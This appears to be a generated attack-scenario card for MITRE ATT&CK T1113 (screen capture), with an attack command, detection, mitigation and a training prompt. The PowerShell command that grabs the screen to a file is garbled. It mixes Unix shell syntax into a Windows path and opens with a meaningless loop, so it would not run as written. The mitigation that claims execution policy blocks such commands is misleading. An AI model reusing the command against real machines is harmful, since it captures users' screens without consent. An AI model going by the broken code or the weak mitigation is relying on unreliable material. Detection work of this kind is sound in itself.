---
type: campaign
scenario_id: 212
tactic: Collection
technique: "T1113: Screen Capture"
technique_id: T1113
tags: [campaign, lotl, collection]
---

# Using PowerShell to capture screenshot for data collection.

## Threat Description
Using PowerShell to capture screenshot for data collection.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds | % { $b = New-Object System.Drawing.Bitmap $_.Width,$_.Height; $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $b.Save('C:\$(echo screen$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).png)') }"
```

## Detection Logic
Monitor screenshot activity: `wmic process where name='powershell.exe' get commandline | findstr System.Drawing`; Event ID 4688.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Monitor file creation: `auditpol /set /subcategory:'File System' /success:enable`.

## AI Training Prompt
Train AI to detect PowerShell screenshot capture and suggest execution policy restrictions.

## References
- MITRE ATT&CK T1113: https://attack.mitre.org/techniques/T1113/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
